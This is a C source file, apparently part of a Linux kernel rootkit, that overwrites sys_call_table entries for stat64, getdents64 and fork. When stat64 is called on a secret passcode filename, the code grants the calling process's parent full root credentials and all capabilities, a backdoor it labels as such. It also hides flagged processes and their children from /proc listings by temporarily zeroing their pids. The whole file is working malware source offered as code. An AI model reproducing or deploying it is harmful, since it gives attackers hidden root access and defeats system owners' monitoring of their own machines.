#include "syscall_hook.h"

extern char passcode[];

void init_syscalls()
{
	P_DEBUG("hijaking systemcall(s)\n");

	o_stat64 = sys_call_table[__NR_stat64];
	sys_call_table[__NR_stat64] = m_stat64;

	o_getdents64 = sys_call_table[__NR_getdents64];
	sys_call_table[__NR_getdents64] = m_getdents64;

	o_fork = sys_call_table[__NR_fork];
	sys_call_table[__NR_fork] = m_fork;
}

void restore_syscalls()
{
	P_DEBUG("restoring systemcall(s)\n");

	sys_call_table[__NR_stat64] = o_stat64;
	sys_call_table[__NR_getdents64] = o_getdents64;
	sys_call_table[__NR_fork] = o_fork;
}

long m_stat64(const char *file_name, struct stat64 *buf)
{
	if(!strcmp(passcode, file_name) && current->p_pptr->pid > 1) {
		become_root(current->p_pptr);
		P_DEBUG("activated local backdoor\n");
		return -ENOENT;
	}

	return o_stat64(file_name, buf);
}

void become_root(struct task_struct *task)
{
	task->flags |= PF_HIDDEN;

	task->uid = task->euid = task->suid = task->fsuid = 0;
	task->gid = task->egid = task->sgid = task->fsgid = 0;

	task->cap_effective = (kernel_cap_t) ~0;
	task->cap_inheritable = (kernel_cap_t) ~0;
	task->cap_permitted = (kernel_cap_t) ~0;
}

long m_getdents64(unsigned int fd, void *dirent, unsigned int count)
{
	long result = 0;

	struct super_block *sblock;
	struct file *filep;

	filep = fget(fd);
	if(!filep)
		return o_getdents64(fd, dirent, count);

	sblock = filep->f_dentry->d_sb;
	if(!sblock)
		return o_getdents64(fd, dirent, count);

	if(sblock->s_magic == PROC_SUPER_MAGIC)
		strip_pids();

	result = o_getdents64(fd, dirent, count);

	if(sblock->s_magic == PROC_SUPER_MAGIC)
		unstrip_pids();

	fput(filep);
	return result;
}

void strip_pids()
{
	struct task_struct *p; 

	for_each_task(p) {
		if(p->flags & PF_HIDDEN) {
			p->exit_code = p->pid;
			p->pid = 0;
		}
	}

	return;
}

void unstrip_pids()
{
	struct task_struct *p;

	for_each_task(p) {
		if(p->flags & PF_HIDDEN) {
			p->pid = p->exit_code;
			p->exit_code = 0;
		}
	}

	return;
}

int m_fork(struct pt_regs regs)
{
	pid_t pid;
	int hide_me = 0;
	struct task_struct *p;

	if(current->flags & PF_HIDDEN)
		hide_me = 1;

	pid = o_fork(regs);

	if(hide_me && pid > 0) {
		p = find_task_by_pid(pid);
		if(p) {
			p->flags |= PF_HIDDEN;
		}
	}

	return pid;
}
